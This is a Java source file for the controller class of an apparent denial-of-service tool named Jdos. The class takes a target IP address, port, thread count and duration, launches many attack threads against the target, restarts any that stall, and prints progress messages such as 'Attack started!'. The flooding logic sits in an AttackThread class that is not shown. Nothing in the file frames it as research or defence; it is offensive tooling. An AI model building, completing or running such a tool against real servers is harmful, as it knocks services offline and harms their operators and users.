package com.filippo.jdos;

/**
 * @author Filippo Finke
 */
public class Jdos extends Thread {

    private String ip;
    private int port;
    private AttackThread[] threads;
    private long[] lastUpdates;
    private int time;
    boolean running = false;

    public String getIp() {
        return ip;
    }

    public int getPort() {
        return port;
    }

    public boolean isRunning() {
        return running;
    }

    public void ping(int index) {
        lastUpdates[index] = System.currentTimeMillis();
    }

    public void kill() {
        running = false;
    }

    public Jdos(String ip, int port, int threads, int time) {
        this.ip = ip;
        this.port = port;
        this.threads = new AttackThread[threads];
        this.lastUpdates = new long[threads];
        this.time = time * 1000;
    }

    @Override
    public void run() {
        running = true;
        System.out.println("Preparing attack " + ip + ":" + port + " with " + threads.length + " threads for " + time + " s");

        System.out.println("Creating threads...");
        for (int index = 0; index < threads.length; index++) {
            threads[index] = new AttackThread(index, this);
        }
        System.out.println("Starting threads...");
        try {
            for (AttackThread thread : threads) {
                thread.start();
                sleep(10);
            }
        } catch (InterruptedException ex) {
        }
        System.out.println("Attack started!");

        long started = System.currentTimeMillis();
        try {
            while (isRunning() && System.currentTimeMillis() - started <= time) {
                for (int index = 0; index < lastUpdates.length; index++) {
                    long update = lastUpdates[index];
                    if (System.currentTimeMillis() - update > 1000) {
                        threads[index].kill();
                        threads[index] = new AttackThread(index, this);
                        threads[index].start();
                    }
                }
                sleep(100);
            }
        } catch (InterruptedException ie) {

        }

        System.out.println("Killing all threads...");
        try {
            for (AttackThread thread : threads) {
                thread.kill();
                thread.join();
            }
        } catch (InterruptedException ex) {
            System.out.println("Cannot stop thread beacuse the attack was interrupted!");
        }
        System.out.println("Attack stopped!");
    }

}
